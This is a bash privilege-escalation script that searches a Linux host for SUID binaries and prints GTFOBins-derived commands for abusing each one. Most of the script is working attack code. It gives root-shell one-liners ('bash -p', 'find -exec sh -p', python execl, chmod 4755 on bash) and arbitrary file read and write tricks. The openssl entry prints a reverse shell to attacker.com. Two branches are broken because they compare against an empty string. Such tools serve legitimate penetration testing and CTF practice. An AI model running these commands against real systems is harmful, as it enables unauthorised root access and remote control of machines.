#!/bin/bash

#Author: Jorge Olmedo (J0lm3d0)

#PrivEsc
#This tool search interesting binaries with SUID bit active and print the commands to exploit it correctly

#The information is based in GTFOBins web (https://gtfobins.github.io/)

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"

bins=$(find / -perm -u=s -type f 2>/dev/null | awk '{print $NF}' FS=/)

for bin in $bins
do
# if [ $bin == "aria2c" ]
# then
#  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}"
#  echo -e "\tCOMMAND='id'"
#  echo -e '\tTF=$(mktemp)\n\techo "$COMMAND" > $TF\n\tchmod +x $TF\n\taria2c --on-download-error=$TF http://x'
 if [ $bin == "arp" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e '\tarp -v -f file_to_read'
 elif [ $bin == "ash" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tash"
 elif [ $bin == "base32" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e '\tbase32 file_to_read | base32 --decode'
 elif [ $bin == "base64" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e '\tbase64 file_to_read | base64 --decode'
elif [ $bin == "bash" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tbash -p"
 elif [ $bin == "busybox" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tbusybox sh"
 elif [ $bin == "cat" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e '\tcat file_to_read'
 elif [ $bin == "chmod" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tchmod 4755 $(which bash)\n\t bash -p"
 elif [ $bin == "chown" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tchown $(id -un):$(id -gn) $(which bash)\n\tchmod 4755 $(which bash)\n\tchown root:root $(which bash)\n\tbash -p"
 elif [ $bin == "chroot" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tchroot / /bin/bash -p"
 elif [ $bin == "cp" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Write file"
  echo -e '\techo "What you want to write" | cp /dev/stdin file_to_write'
 elif [ $bin == "csh" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tcsh -b"
# elif [ $bin == "curl" ]
# then
#  echo -e "${yellowColour}[+]${greenColour}$bin${endColour}"
 elif [ $bin == "cut" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e '\tcut -d "" -f1 file_to_read'
 elif [ $bin == "dash" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tdash -p"
 elif [ $bin == "date" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e '\tdate -f file_to_read'
 elif [ $bin == "dd" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Write file"
  echo -e '\techo "What you want to write" | dd of=file_to_write'
 elif [ $bin == "" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e '\tdialog --textbox file_to_read 0 0'
 elif [ $bin == "" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tdiff --line-format=%L /dev/null file_to_read"
 elif [ $bin == "dmsetup" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tdmsetup create base <<EOF\n\t0 3534848 linear /dev/loop0 94208\n\tEOF\n\tdmsetup ls --exec '$(which sh) -p -s''"
 elif [ $bin == "docker" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tdocker run -v /:/mnt --rm -it alpine chroot /mnt sh"

 elif [ $bin == "emacs" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\temacs -Q -nw --eval '(term \"$(which sh) -p\")'"

 elif [ $bin == "env" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tenv $(which sh) -p"
 elif [ $bin == "eqn" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\teqn file_to_read"

 elif [ $bin == "expand" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\texpand file_to_read"
 elif [ $bin == "expect" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "expect -c 'spawn $(which sh) -p;interact'"
 elif [ $bin == "file" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour} Read file"
  echo -e "\tfile -f file_to_read"
 elif [ $bin == "find" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tfind / -exec $(which sh) -p \; -quit"
 elif [ $bin == "flock" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tflock -u / $(which sh) -p"
 elif [ $bin == "fmt" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tfmt -999 file_to_read"
 elif [ $bin == "fold" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tfold -w99999999 file_to_read"
 elif [ $bin == "gdb" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tgdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"
 elif [ $bin == "gimp" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tgimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
 elif [ $bin == "grep" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tgrep '' file_to_read"
 elif [ $bin == "gtester" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e '\tTF=$(mktemp)\n\techo "#!/bin/sh" > $TF\n\techo "exec /bin/sh -p 0<&1" >> $TF\n\tchmod +x $TF\n\tsudo gtester -q $TF'
 elif [ $bin == "hd" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\thd file_to_read"
 elif [ $bin == "head" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\thead -c1G file_to_read"
 elif [ $bin == "hexdump" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\thexdump -C file_to_read"
 elif [ $bin == "highlight" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\thighlight --no-doc --failsafe file_to_read"
 elif [ $bin == "iconv" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\ticonv -f 8859_1 -t 8859_1 file_to_read"
 elif [ $bin == "ionice" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tionice /bin/sh -p"
 elif [ $bin == "ip" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tip -force -batch file_to_read"
 elif [ $bin == "jjs" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\techo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs"
 elif [ $bin == "jq" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tjq -Rr . file_to_read"
 elif [ $bin == "jrunscript" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tjrunscript -e \"exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""
 elif [ $bin == "ksh" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tksh -p"
 elif [ $bin == "ksshell" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tksshell -i file_to_read"
 elif [ $bin == "ld.so" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tld.so /bin/sh -p"
 elif [ $bin == "less" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tless file_to_read"
 elif [ $bin == "logsave" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tlogsave /dev/null /bin/sh -i -p"
 elif [ $bin == "look" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tlook '' file_to_read"
# elif [ $bin == "lwp-download" ]
# then
#  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}"
 elif [ $bin == "lwp-request" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tlwp-request \"file://file_to_read\""
 elif [ $bin == "make" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tCOMMAND='/bin/sh -p'"
  echo -n "\tmake -s --eval=$'x:\n\t-'";
  echo -e '"$COMMAND"'
 elif [ $bin == "more" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tmore file_to_read"
 elif [ $bin == "mv" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Write file"
  echo -e '\tLFILE=file_to_write\n\tTF=$(mktemp)\n\techo "What you want to write" > $TF\n\tmv $TF $LFILE'
 elif [ $bin == "nano" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tnano\n\t^R^X\n\treset; sh 1>&0 2>&0"
  echo -e "\t${purpleColour}** OR **${endColour}\n\tnano -s $(which sh)\n\t/$(which sh)\n\t^T"
 elif [ $bin == "nice" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tnice $(which sh) -p"
 elif [ $bin == "nl" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\nnl -bn -w1 -s '' file_to_read"
 elif [ $bin == "node" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tnode -e 'require(\"child_process\").spawn(\"$(which sh)\", [\"-p\"], {stdio: [0, 1, 2]});'"
 elif [ $bin == "nohup" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tsudo nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
 elif [ $bin == "od" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tod -An -c -w9999 file_to_read"
 elif [ $bin == "openssl" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\t ${purpleColour}*** RUN IN ATTACKERS COMPUTER ***${endColour}"
  echo -e "\topenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\topenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
  echo -e "\t ${purpleColour}*** RUN IN VULNERABLE COMPUTER ***${endColour}"
  echo -e "\tRHOST=attacker.com\n\tRPORT=12345\n\tmkfifo /tmp/s; $(which sh) -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s"
 elif [ $bin == "perl" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tsudo perl -e 'exec \"$(which sh)\";'"
 elif [ $bin == "pg" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tpg file_to_read"
 elif [ $bin == "php" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "php -r \"pcntl_exec('$(which sh)', ['-p']);\""
 elif [ $bin == "pico" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tpico\n\t^R^X\n\treset; sh 1>&0 2>&0"
 elif [ $bin == "python" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tpython -c 'import os; os.execl(\"$(which sh)\", \"sh\", \"-p\")'"
 elif [ $bin == "readelf" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\treadelf -a @file_to_read"
# elif [ $bin == "restic" ]
# then
#  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}"
 elif [ $bin == "rlwrap" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\trlwrap -H /dev/null $(which sh) -p"
 elif [ $bin == "rpm" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\trpm --eval '%{lua:os.execute(\"$(which sh)\", \"-p\")}'"
 elif [ $bin == "rpmquery" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\trpmquery --eval '%{lua:posix.exec(\"$(which sh)\", \"-p\")}'"
 elif [ $bin == "rsync" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\trsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
 elif [ $bin == "run-parts" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\trun-parts --new-session --regex '^sh$' /bin --arg='-p'"
 elif [ $bin == "rvim" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\trvim -c ':py import os; os.execl(\"$(which sh)\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
 elif [ $bin == "sed" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tsed -e '' file_to_read"
 elif [ $bin == "setarch" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tsetarch $(arch) $(which sh) -p"
 elif [ $bin == "shuf" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Write file"
  echo -e "\tshuf -e What_you_want_to_write -o file_to_write"
 elif [ $bin == "soelim" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tsoelim file_to_read"
 elif [ $bin == "sort" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tsort -m file_to_read"
 elif [ $bin == "start-stop-daemon" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tstart-stop-daemon -n $RANDOM -S -x $(which sh) -- -p"
 elif [ $bin == "stdbuf" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tstdbuf -i0 $(which sh) -p"
 elif [ $bin == "strace" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tstrace -o /dev/null $(which sh) -p"
 elif [ $bin == "strings" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tstrings file_to_read"
 elif [ $bin == "sysctl" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tsysctl -n \"/../../file_to_read\""
 elif [ $bin == "systemctl" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tTF=$(mktemp).service\n\techo '[Service]\n\tType=oneshot\n\tExecStart=$(which sh) -c \"id > /tmp/output\"\n\t[Install]"
  echo -en "\tWantedBy=multi-user.target' > ";echo -e '$TF\n\tsystemctl link $TF\n\tsystemctl enable --now $TF'
 elif [ $bin == "tac" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\ttac -s 'RANDOM' file_to_read"
 elif [ $bin == "tail" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\ttail -c1G file_to_read"
 elif [ $bin == "taskset" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\ttaskset 1 $(which sh) -p"
 elif [ $bin == "tclsh" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\ttclsh\n\texec /bin/sh -p <@stdin >@stdout 2>@stderr"
 elif [ $bin == "tee" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Write file"
  echo -e "\techo What_you_want_to_write | tee -a file_to_write"
# elif [ $bin == "tftp" ]
# then
#  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}
 elif [ $bin == "time" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\ttime $(which sh) -p"
 elif [ $bin == "timeout" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\ttimeout 7d $(which sh) -p"
 elif [ $bin == "ul" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tul file_to_read"
 elif [ $bin == "unexpand" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tunexpand -t99999999 file_to_read"
 elif [ $bin == "uniq" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tuniq file_to_read"
 elif [ $bin == "unshare" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tunshare -r $(which sh)"
 elif [ $bin == "uudecode" ] || [ $bin == "uuencode" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tuuencode file_to_read /dev/stdout | uudecode"
 elif [ $bin == "vim" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\t${purpleColour}*** REQUIRES THAT VIM IS COMPILED WITH PYTHON SUPPORT ***${endColour}"
  echo -e "\tvim -c ':py import os; os.execl(\"$(which sh)\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
 elif [ $bin == "watch" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\twatch -x sh -c 'reset; exec sh 1>&0 2>&0'"
# elif [ $bin == "wget" ]
# then
#  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}"
 elif [ $bin == "xargs" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\txargs -a /dev/null sh -p"
 elif [ $bin == "xxd" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\txxd file_to_read | xxd -r"
 elif [ $bin == "xz" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\txz -c file_to_read | xz -d"
 elif [ $bin == "zsh" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Shell"
  echo -e "\tzsh"
 elif [ $bin == "zsoelim" ]
 then
  echo -e "${yellowColour}[+]${greenColour}$bin\t\t Path: $(which $bin)${endColour}\t Read file"
  echo -e "\tzsoelim file_to_read"
 fi
done